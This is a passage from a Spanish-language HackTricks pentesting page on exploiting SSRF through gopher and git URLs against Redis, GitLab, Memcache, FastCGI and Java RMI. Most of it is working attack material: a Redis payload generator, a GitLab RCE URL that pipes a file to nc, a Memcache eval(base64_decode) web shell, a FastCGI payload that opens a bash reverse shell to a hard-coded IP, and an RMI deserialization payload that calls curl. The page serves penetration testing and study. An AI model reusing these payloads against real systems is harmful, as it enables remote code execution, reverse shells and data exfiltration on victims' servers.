cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**RCE en GitLab a trav√©s del protocolo Git**

Excelente art√≠culo de Liveoverflow [aqu√≠](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/).

Aunque se requiere acceso autenticado a GitLab para explotarlo, incluir√© aqu√≠ el payload ya que el protocolo `git` puede funcionar en el objetivo que est√°s hackeando. Este payload es solo de referencia.
```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
## Memcache

**Puerto com√∫nmente utilizado: 11211**

* [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
* [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
* [Ejemplo de carga √∫til Gopher para Memcache](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)
```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```
## Apache Tomcat

**Puertos com√∫nmente utilizados: 80, 443 (SSL), 8080, 8443 (SSL)**

Efectivo solo contra Tomcat 6:

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

CTF writeup utilizando esta t√©cnica:

[De XXE a RCE: Pwn2Win CTF 2018 Writeup](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

## FastCGI

**Puertos com√∫nmente utilizados: 80, 443 (SSL)**

Esto fue tomado de [aqu√≠](https://blog.chaitin.cn/gopher-attack-surfaces/).
```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
## Java RMI

**Puertos com√∫nmente enlazados: 1090,1098,1099,1199,4443-4446,8999-9010,9999**

Las vulnerabilidades ciegas de _SSRF_ que permiten bytes arbitrarios (basados en _gopher_) se pueden utilizar para realizar ataques de deserializaci√≥n o de c√≥digo en los componentes predeterminados de _Java RMI_ (_RMI Registry_, _Distributed Garbage Collector_, _Activation System_). Se puede encontrar un an√°lisis detallado [aqu√≠](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/). El siguiente listado muestra un ejemplo de generaci√≥n de carga √∫til:
```
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
